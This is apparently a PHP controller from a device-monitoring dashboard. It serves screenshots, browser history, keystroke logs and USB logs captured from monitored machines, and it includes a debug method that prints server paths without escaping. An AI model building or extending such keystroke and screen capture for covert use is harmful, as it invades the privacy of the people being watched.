<?php
require_once BASEPATH . 'app/controllers/Base.php';
require_once BASEPATH . 'app/services/LogParserService.php';
require_once BASEPATH . 'app/services/StatusService.php';
require_once BASEPATH . 'app/services/MonitorMediaPaths.php';

class View extends Base {
    private $logParser;
    private $statusService;
    
    public function __construct() {
        parent::__construct();
        $this->logParser = new LogParserService();
        $this->statusService = StatusService::getInstance();
    }
    
    public function index() {
        if(($this->user['role']??'')==='viewer'){
            $this->view('view/aggregate');return;
        }
        // Get monitors from database only (no expensive file scanning)
        $monitors = $this->db->fetchAll(
            "SELECT m.*,owner.name AS username FROM tbl_monitor_ips m LEFT JOIN users owner ON owner.id=m.owner_user_id ORDER BY owner.name ASC,m.id ASC"
        );
        
        // Add basic status based on database data only
        foreach ($monitors as &$monitor) {
            $monitor['id']=(int)$monitor['id'];
            // Use StatusService's calculateClientStatus() for consistent status calculation
            $statusInfo = $this->statusService->calculateClientStatus($monitor['last_monitor_tic'] ?? null);
            $monitor['live_status'] = $statusInfo['status'];
            $monitor['status_class'] = $statusInfo['status_class'];
            $monitor['status_text'] = $statusInfo['status_text'];
            $monitor['latest_activity'] = $statusInfo['updated_at_timestamp'];
        }
        
        $this->view('view/index', ['monitors' => $monitors]);
    }
    

    
    // logs_detail method removed - use database-based logs() method instead
    
    public function api_screenshots() {
        // Get pagination parameters
        $page = isset($_GET['page']) ? max(1, intval($_GET['page'])) : 1;
        $per_page = isset($_GET['per_page']) ? min(50, max(1, intval($_GET['per_page']))) : 50;
        $offset = ($page - 1) * $per_page;
        
        // Get monitor filter
        $selected_monitors = [];
        if (isset($_GET['monitors']) && !empty($_GET['monitors'])) {
            $selected_monitors = array_map('intval', explode(',', $_GET['monitors']));
        }
        
        // Get specific monitor ID for detail device view
        $specific_monitor_id = isset($_GET['monitor_id']) ? intval($_GET['monitor_id']) : null;
        
        if ($specific_monitor_id) {
            // DETAIL DEVICE VIEW: Load paginated screenshots for a specific monitor from database
            $monitor = $this->db->fetch(
                "SELECT m.*,owner.name AS username FROM tbl_monitor_ips m LEFT JOIN users owner ON owner.id=m.owner_user_id WHERE m.id=:id",
                ['id' => $specific_monitor_id]
            );
            
            if (!$monitor) {
                $this->json(['error' => 'Monitor not found']);
                return;
            }
                
                // Get date filter parameters
                $start_date = isset($_GET['start_date']) ? $_GET['start_date'] : null;
                $end_date = isset($_GET['end_date']) ? $_GET['end_date'] : null;
                
            // Build WHERE clause for date filtering
            $where_conditions = ["monitor_ip_id = :monitor_id"];
            $params = ['monitor_id' => $monitor['id']];
            
            if ($start_date) {
                $where_conditions[] = "capture_datetime >= :start_date";
                $params['start_date'] = $start_date . ' 00:00:00';
            }
            
            if ($end_date) {
                $where_conditions[] = "capture_datetime <= :end_date";
                $params['end_date'] = $end_date . ' 23:59:59';
            }
            
            $where_clause = implode(' AND ', $where_conditions);
            
            // Get total count
            $total_screenshots = $this->db->fetch(
                "SELECT COUNT(*) as total FROM screenshot_metadata WHERE {$where_clause}",
                $params
            )['total'];
            
                $total_pages = ceil($total_screenshots / $per_page);
                
            // Get paginated screenshots
            $screenshots = $this->db->fetchAll(
                "SELECT * FROM screenshot_metadata 
                 WHERE {$where_clause} 
                 ORDER BY capture_datetime DESC 
                 LIMIT :limit OFFSET :offset",
                array_merge($params, ['limit' => $per_page, 'offset' => $offset])
            );
            
            // Add monitor info and format data
            foreach ($screenshots as $index => &$screenshot) {
                    $screenshot['monitor'] = $monitor;
                $screenshot['thumbnail'] = $this->getRelativePath($this->preferredScreenshotPath($screenshot));
                $screenshot['screenshot'] = $this->getRelativePath($screenshot['file_path']);
                $screenshot['global_id'] = $this->generateScreenshotId($monitor['id'], $screenshot['file_path']);
                $screenshot['modified'] = $screenshot['capture_datetime']; // For compatibility
                // Convert UTC datetime to Unix timestamp (explicitly UTC to avoid server timezone issues)
                $screenshot['modified_time'] = (new DateTime($screenshot['capture_datetime'], new DateTimeZone('UTC')))->getTimestamp();
                }
                
                $this->json([
                'screenshots' => $screenshots,
                    'pagination' => [
                        'current_page' => $page,
                        'per_page' => $per_page,
                        'total_screenshots' => $total_screenshots,
                        'total_pages' => $total_pages,
                        'has_next' => $page < $total_pages,
                        'has_prev' => $page > 1
                ],
                'view_type' => 'detail_device',
                'monitor' => $monitor,
                'total_screenshots_for_navigation' => $total_screenshots
                ]);
        } else {
            // ENTIRE DEVICE VIEW: Load latest screenshots for all monitors from database
            // OPTIMIZED: Use derived table instead of correlated subquery for much better performance
            $where_conditions = [];
            $params = [];
            
            // Filter monitors if specific ones are selected
            if (!empty($selected_monitors)) {
                $placeholders = str_repeat('?,', count($selected_monitors) - 1) . '?';
                $where_conditions[] = "latest.monitor_ip_id IN ({$placeholders})";
                $params = array_merge($params, $selected_monitors);
            }
            
            $where_clause = !empty($where_conditions) ? 'WHERE ' . implode(' AND ', $where_conditions) : '';
            
            // Optimized query: Use derived table to get latest screenshot per monitor, then JOIN once
            // This is MUCH faster than the correlated subquery approach
            // Include MAC address in JOIN for path resolution
            $latest_screenshots = $this->db->fetchAll(
                "SELECT s.*, m.id as monitor_id, m.ip_address, m.mac_address, owner.name AS username, CONCAT('Device #',m.id) as monitor_name
                 FROM (
                     SELECT monitor_ip_id, MAX(id) as max_id
                     FROM screenshot_metadata
                     GROUP BY monitor_ip_id
                 ) latest
                 INNER JOIN screenshot_metadata s ON s.id = latest.max_id
                 INNER JOIN tbl_monitor_ips m ON s.monitor_ip_id = m.id
                 LEFT JOIN users owner ON owner.id=m.owner_user_id
                 {$where_clause}
                 ORDER BY s.capture_datetime DESC",
                $params
            );
            
            // Calculate pagination info
            $total_screenshots = count($latest_screenshots);
            $total_pages = ceil($total_screenshots / $per_page);
            
            // Apply pagination
            $paginated_screenshots = array_slice($latest_screenshots, $offset, $per_page);
            
            // Format data for frontend
            foreach ($paginated_screenshots as $index => &$screenshot) {
                // Build monitor info from query results (already includes MAC address)
                $monitor_info = [
                    'id' => $screenshot['monitor_id'],
                    'ip_address' => $screenshot['ip_address'],
                    'mac_address' => $screenshot['mac_address'] ?? null,
                    'username' => $screenshot['username'],
                    'name' => $screenshot['monitor_name']
                ];
                
                $screenshot['monitor'] = [
                    'id' => $screenshot['monitor_ip_id'],
                    'ip_address' => $screenshot['ip_address'],
                    'username' => $screenshot['username'],
                    'name' => $screenshot['monitor_name']
                ];
                $screenshot['thumbnail'] = $this->getRelativePath($this->preferredScreenshotPath($screenshot));
                $screenshot['screenshot'] = $this->getRelativePath($screenshot['file_path']);
                $screenshot['id'] = $offset + $index + 1;
                $screenshot['global_id'] = $this->generateScreenshotId($screenshot['monitor_ip_id'], $screenshot['file_path']);
                $screenshot['modified'] = $screenshot['capture_datetime']; // For compatibility
                // Convert UTC datetime to Unix timestamp (explicitly UTC to avoid server timezone issues)
                $screenshot['modified_time'] = (new DateTime($screenshot['capture_datetime'], new DateTimeZone('UTC')))->getTimestamp();
            }
            
            $this->json([
                'screenshots' => $paginated_screenshots,
                'pagination' => [
                    'current_page' => $page,
                    'per_page' => $per_page,
                    'total_screenshots' => $total_screenshots,
                    'total_pages' => $total_pages,
                    'has_next' => $page < $total_pages,
                    'has_prev' => $page > 1
                ],
                'view_type' => 'entire_device'
            ]);
        }
    }
    
    // api_logs method removed - use database-based api_logs_paginated() method instead
    
    // api_all_screenshots method removed - use database-based api_screenshots() method instead
    
    public function api_parsed_log($ip_id, $log_type, $file_path) {
        $monitor = $this->db->fetch(
            "SELECT m.*,owner.name AS username FROM tbl_monitor_ips m LEFT JOIN users owner ON owner.id=m.owner_user_id WHERE m.id=:id",
            ['id' => $ip_id]
        );
        
        if (!$monitor) {
            $this->json(['error' => 'Monitor not found']);
        }
        
        // Decode the file path
        $file_path = urldecode($file_path);
        
        // Construct full path
        $full_path = realpath(BASEPATH . 'data/logs/ip_' . $monitor['ip_address'] . '/' . $file_path);
        $allowed = realpath(BASEPATH . 'data/logs');
        if(!$allowed||!$full_path||!str_starts_with($full_path,$allowed.DIRECTORY_SEPARATOR)){
            http_response_code(403);$this->json(['error'=>'Invalid log path']);
        }
        
        if (!file_exists($full_path)) {
            $this->json(['error' => 'Log file not found']);
        }
        
        // Read file content
        $content = file_get_contents($full_path);
        if ($content === false) {
            $this->json(['error' => 'Unable to read log file']);
        }
        
        // Parse content based on log type
        $parsedData = [];
        $headers = [];
        
        switch ($log_type) {
            case 'browser_history':
                $parsedData = $this->logParser->parseBrowserHistory($content);
                break;
            case 'key_logs':
                $parsedData = $this->logParser->parseKeyLogs($content);
                break;
            case 'usb_logs':
                $parsedData = $this->logParser->parseUsbLogs($content);
                break;
            default:
                $parsedData = $this->logParser->parseGenericLog($content, $log_type);
                break;
        }
        
        $headers = $this->logParser->getTableHeaders($parsedData, $log_type);
        
        $this->json([
            'success' => true,
            'data' => $parsedData,
            'headers' => $headers,
            'log_type' => $log_type,
            'file_path' => $file_path
        ]);
    }
    
    public function api_live_status() {
        // Get monitors from database only (fast)
        // OPTIMIZED: Only select fields needed for status calculation and response
        $monitors = $this->db->fetchAll(
            "SELECT m.id,m.ip_address,m.last_seen_ip,m.mac_address,m.platform,
                    owner.name AS username,owner.user_no,CONCAT('Device #',m.id) AS name,m.type,m.last_monitor_tic,m.updated_at,m.created_at
             FROM tbl_monitor_ips m LEFT JOIN users owner ON owner.id=m.owner_user_id
             ORDER BY owner.name ASC,m.id ASC"
        );
        
        // Add status based on database data only
        foreach ($monitors as &$monitor) {
            $monitor['id']=(int)$monitor['id'];
            // Use StatusService's calculateClientStatus() for consistent status calculation
            $statusInfo = $this->statusService->calculateClientStatus($monitor['last_monitor_tic'] ?? null);
            $monitor['live_status'] = $statusInfo['status'];
            $monitor['status_text'] = $statusInfo['status_text'];
            $monitor['latest_activity'] = $statusInfo['updated_at_timestamp'];
        }
        
        $this->json($monitors);
    }
    
    public function view_file($file_path = '') {
        // PHP has already decoded the query parameter once. Resolve it against
        // known screenshot/log roots rather than assuming Apache's CWD.
        $requested=(string)($_GET['path']??$file_path);
        $absolute=monitorResolveMediaPath($requested);
        if($absolute===null){
            http_response_code(404);
            header('Content-Type: text/plain; charset=utf-8');
            header('Cache-Control: no-store');
            echo 'Media file not found';
            return;
        }
        $extension=strtolower(pathinfo($absolute,PATHINFO_EXTENSION));
        $types=['jpg'=>'image/jpeg','jpeg'=>'image/jpeg','png'=>'image/png',
            'webp'=>'image/webp','txt'=>'text/plain; charset=utf-8'];
        if(!isset($types[$extension])){
            http_response_code(415);echo 'Unsupported media type';return;
        }
        header('Content-Type: '.$types[$extension]);
        header('X-Content-Type-Options: nosniff');
        header('Cache-Control: private, max-age=120');
        header('Content-Length: '.filesize($absolute));
        // Binary responses must terminate the front controller immediately.
        // Otherwise trailing PHP/template output can corrupt JPEG/PNG payloads.
        if(($_SERVER['REQUEST_METHOD']??'GET')==='HEAD')exit;
        readfile($absolute);
        exit;
    }

    private function preferredScreenshotPath(array $shot): string {
        $original=(string)($shot['file_path']??'');
        $thumbnail=(string)($shot['thumbnail_path']??'');
        return $thumbnail!=='' && monitorResolveMediaPath($thumbnail)!==null
            ? $thumbnail : $original;
    }

    private function getRelativePath($path): string {
        if(!is_string($path)||$path==='')return '';
        $relative=monitorPublicMediaPath($path);
        return $relative===null?'':'view/view_file?path='.rawurlencode($relative);
    }

    public function formatFileSize($bytes) {
        if ($bytes === 0) return "0 Bytes";
        $k = 1024;
        $sizes = ["Bytes", "KB", "MB", "GB"];
        $i = floor(log($bytes) / log($k));
        return round($bytes / pow($k, $i), 2) . " " . $sizes[$i];
    }
    
    /**
     * Generate unique screenshot ID for navigation
     */
    private function generateScreenshotId($monitor_id, $file_path) {
        return 'screenshot_' . $monitor_id . '_' . md5($file_path);
    }
    
    /**
     * API endpoint to get screenshot by ID for navigation
     */
    public function api_screenshot_by_id($screenshot_id) {
        // Parse screenshot ID to get monitor ID and file hash
        if (!preg_match('/^screenshot_(\d+)_(.+)$/', $screenshot_id, $matches)) {
            $this->json(['error' => 'Invalid screenshot ID']);
            return;
        }
        
        $monitor_id = intval($matches[1]);
        $file_hash = $matches[2];
        
        $monitor = $this->db->fetch(
            "SELECT m.*,owner.name AS username FROM tbl_monitor_ips m LEFT JOIN users owner ON owner.id=m.owner_user_id WHERE m.id=:id",
            ['id' => $monitor_id]
        );
        
        if (!$monitor) {
            $this->json(['error' => 'Monitor not found']);
            return;
        }
        
        // Find screenshot by file hash in database
        $screenshot = $this->db->fetch(
            "SELECT * FROM screenshot_metadata WHERE monitor_ip_id = :monitor_id AND MD5(file_path) = :file_hash",
            ['monitor_id' => $monitor_id, 'file_hash' => $file_hash]
        );
        
        if (!$screenshot) {
            $this->json(['error' => 'Screenshot not found']);
            return;
        }
        
        $screenshot['monitor'] = $monitor;
        $screenshot['thumbnail'] = $this->getRelativePath($this->preferredScreenshotPath($screenshot));
        $screenshot['screenshot'] = $this->getRelativePath($screenshot['file_path']);
        $screenshot['global_id'] = $screenshot_id;
        
        $this->json([
            'success' => true,
            'screenshot' => $screenshot
        ]);
    }
    
    /**
     * Optimized API endpoint for screenshot navigation
     */
    public function api_screenshot_navigation() {
        $current_id = isset($_GET['cur_id']) ? $_GET['cur_id'] : null;
        $action = isset($_GET['action']) ? $_GET['action'] : null;
        
        if (!$current_id || !$action) {
            $this->json(['error' => 'Missing cur_id or action parameter']);
            return;
        }
        
        if (!in_array($action, ['next', 'prev'])) {
            $this->json(['error' => 'Invalid action. Use "next" or "prev"']);
            return;
        }
        
        // Parse screenshot ID
        if (!preg_match('/^screenshot_(\d+)_(.+)$/', $current_id, $matches)) {
            $this->json(['error' => 'Invalid screenshot ID']);
            return;
        }
        
        $monitor_id = intval($matches[1]);
        $file_hash = $matches[2];
        
        $monitor = $this->db->fetch(
            "SELECT m.*,owner.name AS username FROM tbl_monitor_ips m LEFT JOIN users owner ON owner.id=m.owner_user_id WHERE m.id=:id",
            ['id' => $monitor_id]
        );
        
        if (!$monitor) {
            $this->json(['error' => 'Monitor not found']);
            return;
        }
        
        // Use optimized method to get only the needed screenshots (keyed by monitor_id)
        $result = $this->getScreenshotNavigation($monitor_id, $file_hash, $action);
        
        if (!$result) {
            $this->json(['error' => 'Screenshot navigation failed']);
            return;
        }
        
        $this->json([
            'success' => true,
            'screenshot' => $result['screenshot'],
            'current_position' => $result['current_position'],
            'total_screenshots' => $result['total_screenshots'],
            'has_next' => $result['has_next'],
            'has_prev' => $result['has_prev']
        ]);
    }
    
    /**
     * Database-based screenshot navigation (much faster than file system scanning)
     */
    private function getScreenshotNavigation($monitor_id, $current_file_hash, $action) {
        if (!$monitor_id) {
            return false;
        }

        // Get monitor info (by id, not by ip)
        $monitor = $this->db->fetch(
            "SELECT m.*,owner.name AS username FROM tbl_monitor_ips m LEFT JOIN users owner ON owner.id=m.owner_user_id WHERE m.id=:id",
            ['id' => $monitor_id]
        );

        if (!$monitor) {
            return false;
        }
        
        // Get total count of screenshots for this monitor
        $total_count = $this->db->fetch(
            "SELECT COUNT(*) as total FROM screenshot_metadata WHERE monitor_ip_id = :monitor_id",
            ['monitor_id' => $monitor_id]
        )['total'];
        
        if ($total_count == 0) {
            return false;
        }
        
        // Find current screenshot by file hash
        $current_screenshot = $this->db->fetch(
            "SELECT * FROM screenshot_metadata WHERE monitor_ip_id = :monitor_id AND MD5(file_path) = :file_hash",
            ['monitor_id' => $monitor_id, 'file_hash' => $current_file_hash]
        );
        
        if (!$current_screenshot) {
            return false;
        }
        
        // Get next/previous screenshot based on capture_datetime
        $target_screenshot = null;
        $current_position = 0;
        
        if ($action === 'next') {
            // Get next screenshot (older chronologically, but next in sequence)
            $target_screenshot = $this->db->fetch(
                "SELECT * FROM screenshot_metadata 
                 WHERE monitor_ip_id = :monitor_id 
                 AND capture_datetime < :current_datetime 
                 ORDER BY capture_datetime DESC 
                 LIMIT 1",
                ['monitor_id' => $monitor_id, 'current_datetime' => $current_screenshot['capture_datetime']]
            );
        } else {
            // Get previous screenshot (newer chronologically, but previous in sequence)
            $target_screenshot = $this->db->fetch(
                "SELECT * FROM screenshot_metadata 
                 WHERE monitor_ip_id = :monitor_id 
                 AND capture_datetime > :current_datetime 
                 ORDER BY capture_datetime ASC 
                 LIMIT 1",
                ['monitor_id' => $monitor_id, 'current_datetime' => $current_screenshot['capture_datetime']]
            );
        }
        
        if (!$target_screenshot) {
            return false;
        }
        
        // Get position of target screenshot (count of newer screenshots + 1)
        $position_result = $this->db->fetch(
            "SELECT COUNT(*) as position FROM screenshot_metadata 
             WHERE monitor_ip_id = :monitor_id 
             AND capture_datetime >= :target_datetime",
            ['monitor_id' => $monitor_id, 'target_datetime' => $target_screenshot['capture_datetime']]
        );
        $current_position = $position_result['position'];
        
        // Check if there are more screenshots in each direction
        $has_next = $this->db->fetch(
            "SELECT COUNT(*) as count FROM screenshot_metadata 
             WHERE monitor_ip_id = :monitor_id 
             AND capture_datetime > :target_datetime",
            ['monitor_id' => $monitor_id, 'target_datetime' => $target_screenshot['capture_datetime']]
        )['count'] > 0;
        
        $has_prev = $this->db->fetch(
            "SELECT COUNT(*) as count FROM screenshot_metadata 
             WHERE monitor_ip_id = :monitor_id 
             AND capture_datetime < :target_datetime",
            ['monitor_id' => $monitor_id, 'target_datetime' => $target_screenshot['capture_datetime']]
        )['count'] > 0;
        
        // Build screenshot data
        $screenshot = [
            'id' => $target_screenshot['id'],
            'filename' => $target_screenshot['filename'],
            'file_path' => $target_screenshot['file_path'],
            'thumbnail_path' => $this->preferredScreenshotPath($target_screenshot),
            'capture_datetime' => $target_screenshot['capture_datetime'],
            'file_size' => $target_screenshot['file_size'],
            'image_width' => $target_screenshot['image_width'],
            'image_height' => $target_screenshot['image_height'],
            'monitor' => $monitor,
            'thumbnail' => $this->getRelativePath($this->preferredScreenshotPath($target_screenshot)),
            'screenshot' => $this->getRelativePath($target_screenshot['file_path']),
            'global_id' => $this->generateScreenshotId($monitor['id'], $target_screenshot['file_path'])
        ];
        
        return [
            'screenshot' => $screenshot,
            'current_position' => $current_position,
            'total_screenshots' => $total_count,
            'has_next' => $has_next,
            'has_prev' => $has_prev
        ];
    }
    
    /**
     * Log Management Page - Similar to real-time monitoring but for logs only
     */
    public function logs() {
        // Get monitors from database
        $monitors = $this->db->fetchAll(
            "SELECT m.*,owner.name AS username FROM tbl_monitor_ips m LEFT JOIN users owner ON owner.id=m.owner_user_id ORDER BY owner.name ASC,m.id ASC"
        );
        
        // Add basic status based on database data only
        foreach ($monitors as &$monitor) {
            // Use StatusService's calculateClientStatus() for consistent status calculation
            $statusInfo = $this->statusService->calculateClientStatus($monitor['last_monitor_tic'] ?? null);
            $monitor['live_status'] = $statusInfo['status'];
            $monitor['status_class'] = $statusInfo['status_class'];
            $monitor['status_text'] = $statusInfo['status_text'];
            $monitor['latest_activity'] = $statusInfo['updated_at_timestamp'];
        }
        
        $this->view('view/logs', ['monitors' => $monitors]);
    }
    
    /**
     * API endpoint to get logs for a specific monitor with pagination
     */
    public function api_logs_paginated($monitor_id) {
        $monitor = $this->db->fetch(
            "SELECT m.*,owner.name AS username FROM tbl_monitor_ips m LEFT JOIN users owner ON owner.id=m.owner_user_id WHERE m.id=:id",
            ['id' => $monitor_id]
        );
        
        if (!$monitor) {
            $this->json(['error' => 'Monitor not found']);
            return;
        }
        
        // Get pagination parameters
        $page = isset($_GET['page']) ? max(1, intval($_GET['page'])) : 1;
        $per_page = isset($_GET['per_page']) ? min(100,max(1,(int)$_GET['per_page'])) : 20;
        $log_type = isset($_GET['log_type']) ? $_GET['log_type'] : 'browser_history';
        $offset = ($page - 1) * $per_page;
        
        // Get date filter parameters
        $start_date = isset($_GET['start_date']) ? $_GET['start_date'] : null;
        $end_date = isset($_GET['end_date']) ? $_GET['end_date'] : null;
        
        // Build WHERE conditions
        $where_conditions = ["monitor_ip_id = :monitor_id"];
        $params = ['monitor_id' => $monitor['id']];
        
        if ($start_date) {
            $where_conditions[] = "visit_date >= :start_date";
            $params['start_date'] = $start_date . ' 00:00:00';
        }
        
        if ($end_date) {
            $where_conditions[] = "visit_date <= :end_date";
            $params['end_date'] = $end_date . ' 23:59:59';
        }
        
        $where_clause = implode(' AND ', $where_conditions);
        
        // Get logs from database based on type
        $logs = [];
        $total_entries = 0;
        
        switch ($log_type) {
            case 'browser_history':
                $total_entries = $this->db->fetch(
                    "SELECT COUNT(*) as total FROM browser_history_logs WHERE {$where_clause}",
                    $params
                )['total'];
                
                $logs = $this->db->fetchAll(
                    "SELECT * FROM browser_history_logs 
                     WHERE {$where_clause} 
                     ORDER BY visit_date DESC 
                     LIMIT :limit OFFSET :offset",
                    array_merge($params, ['limit' => $per_page, 'offset' => $offset])
                );
                break;
                
            case 'key_logs':
                // Adjust date field for key_logs
                $key_where = str_replace('visit_date', 'key_date', $where_clause);
                $total_entries = $this->db->fetch(
                    "SELECT COUNT(*) as total FROM key_logs WHERE {$key_where}",
                    $params
                )['total'];
                
                $logs = $this->db->fetchAll(
                    "SELECT * FROM key_logs 
                     WHERE {$key_where} 
                     ORDER BY key_date DESC 
                     LIMIT :limit OFFSET :offset",
                    array_merge($params, ['limit' => $per_page, 'offset' => $offset])
                );
                break;
                
            case 'usb_logs':
                // Adjust date field for usb_logs
                $usb_where = str_replace('visit_date', 'device_date', $where_clause);
                $total_entries = $this->db->fetch(
                    "SELECT COUNT(*) as total FROM usb_device_logs WHERE {$usb_where}",
                    $params
                )['total'];
                
                $logs = $this->db->fetchAll(
                    "SELECT * FROM usb_device_logs 
                     WHERE {$usb_where} 
                     ORDER BY device_date DESC 
                     LIMIT :limit OFFSET :offset",
                    array_merge($params, ['limit' => $per_page, 'offset' => $offset])
                );
                break;
                
            default:
                $this->json(['error' => 'Invalid log type']);
                return;
        }
        
        $total_pages = ceil($total_entries / $per_page);
        
        $this->json([
            'monitor' => $monitor,
            'log_type' => $log_type,
            'pagination' => [
                'current_page' => $page,
                'per_page' => $per_page,
                'total_entries' => $total_entries,
                'total_pages' => $total_pages,
                'has_next' => $page < $total_pages,
                'has_prev' => $page > 1
            ],
            'logs' => $logs
        ]);
    }
    
    
    /**
     * API endpoint to get log statistics for a monitor
     */
    public function api_log_stats($monitor_id) {
        $monitor = $this->db->fetch(
            "SELECT m.*,owner.name AS username FROM tbl_monitor_ips m LEFT JOIN users owner ON owner.id=m.owner_user_id WHERE m.id=:id",
            ['id' => $monitor_id]
        );
        
        if (!$monitor) {
            $this->json(['error' => 'Monitor not found']);
            return;
        }
        
        // Get stats from database using monitor_id
        $stats = [
            'browser_history' => [
                'total_entries' => 0,
                'latest_entry' => null
            ],
            'key_logs' => [
                'total_entries' => 0,
                'latest_entry' => null
            ],
            'usb_logs' => [
                'total_entries' => 0,
                'latest_entry' => null
            ]
        ];
        
        // Calculate stats for each log type from database
        $browser_stats = $this->db->fetch(
            "SELECT COUNT(*) as total, MAX(visit_date) as latest_date 
             FROM browser_history_logs 
             WHERE monitor_ip_id = :monitor_id",
            ['monitor_id' => $monitor['id']]
        );
        $stats['browser_history']['total_entries'] = $browser_stats['total'] ?? 0;
        if ($browser_stats['latest_date']) {
            $latest_browser = $this->db->fetch(
                "SELECT * FROM browser_history_logs 
                 WHERE monitor_ip_id = :monitor_id AND visit_date = :latest_date 
                 ORDER BY id DESC LIMIT 1",
                ['monitor_id' => $monitor['id'], 'latest_date' => $browser_stats['latest_date']]
            );
            $stats['browser_history']['latest_entry'] = $latest_browser;
        }
        
        $key_stats = $this->db->fetch(
            "SELECT COUNT(*) as total, MAX(key_date) as latest_date 
             FROM key_logs 
             WHERE monitor_ip_id = :monitor_id",
            ['monitor_id' => $monitor['id']]
        );
        $stats['key_logs']['total_entries'] = $key_stats['total'] ?? 0;
        if ($key_stats['latest_date']) {
            $latest_key = $this->db->fetch(
                "SELECT * FROM key_logs 
                 WHERE monitor_ip_id = :monitor_id AND key_date = :latest_date 
                 ORDER BY id DESC LIMIT 1",
                ['monitor_id' => $monitor['id'], 'latest_date' => $key_stats['latest_date']]
            );
            $stats['key_logs']['latest_entry'] = $latest_key;
        }
        
        $usb_stats = $this->db->fetch(
            "SELECT COUNT(*) as total, MAX(device_date) as latest_date 
             FROM usb_device_logs 
             WHERE monitor_ip_id = :monitor_id",
            ['monitor_id' => $monitor['id']]
        );
        $stats['usb_logs']['total_entries'] = $usb_stats['total'] ?? 0;
        if ($usb_stats['latest_date']) {
            $latest_usb = $this->db->fetch(
                "SELECT * FROM usb_device_logs 
                 WHERE monitor_ip_id = :monitor_id AND device_date = :latest_date 
                 ORDER BY id DESC LIMIT 1",
                ['monitor_id' => $monitor['id'], 'latest_date' => $usb_stats['latest_date']]
            );
            $stats['usb_logs']['latest_entry'] = $latest_usb;
        }
        
        $this->json([
            'monitor' => $monitor,
            'stats' => $stats
        ]);
    }
    

    public function test() {
        echo "View controller test method<br>";
        
        // Test path conversion
        $test_paths = [
            '/Volumes/Workspace/Projects/monitoring/Backend/html/data/thumbnails/ip_192.168.1.40/2023-08-27/192_168_1_40_2023-08-27_10.30.00.jpeg',
            'html/data/thumbnails/ip_192.168.1.40/2023-08-27/192_168_1_40_2023-08-27_10.30.00.jpeg',
            'data/thumbnails/ip_192.168.1.40/2023-08-27/192_168_1_40_2023-08-27_10.30.00.jpeg',
            'html/data/html/data/thumbnails/ip_192.168.1.233/2025-09-08/192_168_1_233_2025-09-08_05.44.04.jpg'
        ];
        
        echo "<h3>Path Conversion Test:</h3>";
        echo "<p><strong>BASEPATH:</strong> " . BASEPATH . "</p>";
        echo "<p><strong>BASE_URL:</strong> " . BASE_URL . "</p>";
        
        foreach ($test_paths as $path) {
            $converted = $this->getRelativePath($path);
            echo "<p><strong>Original:</strong> $path</p>";
            echo "<p><strong>After BASEPATH removal:</strong> " . str_replace(BASEPATH, '', str_replace('\\', '/', $path)) . "</p>";
            echo "<p><strong>Converted:</strong> $converted</p>";
            echo "<p><strong>Full URL:</strong> " . BASE_URL . $converted . "</p>";
            echo "<hr>";
        }
        
        // Test database paths
        echo "<h3>Database Paths Sample:</h3>";
        $screenshots = $this->db->fetchAll("SELECT file_path, thumbnail_path FROM screenshot_metadata LIMIT 3");
        foreach ($screenshots as $screenshot) {
            echo "<p><strong>File Path:</strong> " . $screenshot['file_path'] . "</p>";
            echo "<p><strong>Thumbnail Path:</strong> " . $screenshot['thumbnail_path'] . "</p>";
            echo "<p><strong>Converted File:</strong> " . $this->getRelativePath($screenshot['file_path']) . "</p>";
            echo "<p><strong>Converted Thumbnail:</strong> " . $this->getRelativePath($screenshot['thumbnail_path']) . "</p>";
            echo "<hr>";
        }
    }
}
